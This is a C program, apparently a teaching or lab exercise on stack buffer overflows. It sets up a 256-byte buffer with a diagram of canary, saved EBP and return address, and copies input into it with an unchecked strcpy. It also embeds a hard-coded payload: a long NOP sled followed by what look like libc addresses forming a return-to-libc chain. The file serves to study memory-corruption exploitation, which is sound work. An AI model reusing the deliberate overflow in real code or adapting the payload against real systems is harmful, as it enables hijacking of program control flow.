#define A 0x41

const char default_shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x60\x91\xf0\xb7\x48\x61\x63\x6b\x24\xa0\x04\x08\x9f\x20\xe4\xb7\x60\x91\xf0\xb7\x65\x64\x21\x21\x28\xa0\x04\x08\x9f\x20\xe4\xb7\x64\x89\xe4\xb7\xf8\x19\xe9\xb7\x39\x63\xf3\xb7\x72\x35\xef\xb7\x64\x89\xe4\xb7\xbb\x28\xe4\xb7\x24\xa0\x04\x08\x2c\xa0\x04\x08\x34\x20\xea\xb7\x64\x89\xe4\xb7\x40\xda\xeb\xb7\x39\x63\xf3\xb7\xe7\xa9\xf4\xb7\x64\x89\xe4\xb7\x10\xda\xeb\xb7\x75\xea\xec\xb7";

long *return_addr, *canary_h, *canary_l;

/**
    Stack:
    ------------------------------------------------
    | buffer    | Canary bytes | EBP     | RET     |
    | 256 bytes | 8 bytes      | 4 bytes | 4 bytes |
    ------------------------------------------------

    *return_addr, *canary_h, *canary_l cannot be local variables because they will end up on the stack and be overwritten.
    By making them global variables we can examine the return address without GDB.
**/

int main(int argc, char *argv[]) {

    char buffer[256];

    return_addr = buffer + 256 + 8 + 4;
    canary_h = buffer + 256;
    canary_l = buffer + 256 + 4;

    // For reference sake - to see where the buffer ends and begins more clearly
    memset(buffer, A, sizeof(buffer));

    // To check if shellcode is broken
    printf("\nargc: %d\n", argc);

    printf("Contents of return address before buffer overflow: %010p\n", *return_addr);

    printf("Canary bytes: %010p %010p\n", *canary_h, *canary_l);

    printf("Buffer address: %010p\n", buffer);

    printf("Return address: %010p\n", return_addr);

    if (argc > 1) {
        strcpy(buffer, argv[1]);
    } else {
        memcpy(buffer, default_shellcode, sizeof(default_shellcode)/sizeof(char));
    }   

    printf("Contents of return address after buffer overflow: %010p\n\n", *return_addr);
        
    return 0;
}